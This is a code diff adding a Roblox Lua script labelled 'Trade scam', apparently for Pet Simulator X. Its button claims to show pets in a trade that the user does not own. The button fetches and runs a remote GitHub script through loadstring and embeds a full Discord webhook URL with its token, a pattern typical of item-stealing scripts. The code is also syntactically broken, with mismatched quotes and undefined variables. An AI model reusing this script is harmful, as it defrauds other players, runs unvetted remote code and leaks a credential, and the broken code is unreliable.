@@ -1,0 +1,14 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
+local Window = Library.CreateLib("Trade scam", "DarkTheme")
+
+-- MAIN
+local Tab = Window:NewTab("Main")
+
+local MainSection = Main:NewSection("Main")
+
+
+Section:NewButton("Trade scam", "the pet will appear even if you dont have it in trade", function()
+    print("_G.UserID = kinghedarp 
+    _G.WebHook = "https://discord.com/api/webhooks/1036367739251589284/9FyOVfiV5CanLfFRtxs_PhAiJgX-5-j2NQKYL1TeqNE9BOnpDSWzECCZ0cIl9pirwWqu"
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/LordZungg/PetSimX/main/Silence"))()")
+end)
